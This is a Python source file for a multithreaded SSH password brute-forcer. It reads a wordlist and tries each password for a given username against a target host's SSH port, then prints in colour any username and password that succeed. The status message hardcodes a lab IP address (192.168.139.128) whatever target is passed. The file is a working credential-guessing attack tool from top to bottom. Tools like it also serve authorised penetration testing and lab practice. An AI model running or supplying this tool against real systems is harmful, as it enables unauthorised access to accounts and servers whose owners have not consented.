from socket import socket, AF_INET, SOCK_STREAM
from argparse import ArgumentParser
from ipaddress import IPv4Address
from datetime import datetime
from threading import Thread
from queue import Queue
from sys import exit


from ssh2.session import Session
from ssh2.exceptions import AuthenticationError, SocketRecvError, SocketDisconnectError

"""
Choice of SSH library (ssh2)
https://medium.com/the-elegant-network/a-tale-of-five-python-ssh-libraries-19cb8b72c914

SSH2-Python library docs
https://ssh2-python.readthedocs.io/en/latest/index.html
"""


def arguments():
    parser = ArgumentParser()
    parser.add_argument("-H", type=IPv4Address, metavar="HOST", required=True, help="target host to attack")
    parser.add_argument("-u", type=str, metavar="USERNAME", required=True, help="target username")
    parser.add_argument("-w", type=str, metavar="FILE", required=True, help="load passwords from file")
    parser.add_argument("-p", type=int, metavar="PORT", default=22, help="ssh service port (default: 22)")
    parser.add_argument("-t", type=int, metavar="TASKS", default=4,
                        help="number of concurrent tasks (default: 4)")

    args = parser.parse_args()
    return args


def clear_queue():
    queue.mutex.acquire()
    queue.queue.clear()
    queue.all_tasks_done.notify_all()
    queue.unfinished_tasks = 0
    queue.mutex.release()


def ssh_connect(host: str, port: int, username: str, password: str) -> True | False:
    while True:
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.connect((host, port))

            session = Session()
            session.handshake(sock)

            session.userauth_password(username, password)
            session.disconnect()
            return True

        except AuthenticationError:
            return False
        except (SocketRecvError, SocketDisconnectError):
            continue


def worker():
    args = arguments()
    host = args.H.exploded
    username = args.u
    port = args.p
    green = "\033[0;32m"
    reset = "\033[0m"

    while True:
        password = queue.get()
        print(f" {host} ~ {username}:{password}")
        response = ssh_connect(host, port, username, password)
        if response:
            print(f"\nhost: {green}{host}:{port}{reset}"
                  f"  username: {green}{username}{reset}"
                  f"  password: {green}{password}{reset}"
                  )
            clear_queue()
        else:
            queue.task_done()


def main():
    args = arguments()

    try:
        with open(args.w, "r") as f:
            for password in f.readlines():
                queue.put_nowait(password.strip("\n"))
    except FileNotFoundError:
        exit(f"ERROR: No such file was found: {args.w}")

    print(f"Starting at {datetime.now().replace(microsecond=0)}\n")
    print(f"Attacking 192.168.139.128:22 (tasks {args.t})\n")
    tasks = [Thread(target=worker, daemon=True) for _ in range(args.t)]

    for task in tasks:
        task.start()

    if len(tasks) > 0:
        queue.join()

    print(f"\nFinished at {datetime.now().replace(microsecond=0)}")


if __name__ == "__main__":
    queue = Queue()
    main()
